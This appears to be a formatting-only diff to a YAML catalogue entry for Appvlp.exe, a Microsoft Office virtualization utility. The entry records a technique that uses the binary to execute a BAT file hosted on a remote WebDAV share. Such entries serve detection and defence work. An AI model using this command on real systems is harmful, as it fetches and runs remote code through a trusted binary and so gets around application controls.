@@ -1,8 +1,8 @@
 ---
 Name: Appvlp.exe
-Description: Application Virtualization Utility Included with Microsoft Office 2016 
+Description: Application Virtualization Utility Included with Microsoft Office 2016
 Author: ''
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: AppVLP.exe \\webdav\calc.bat
     Usecase: Execution of BAT file hosted on Webdav server.
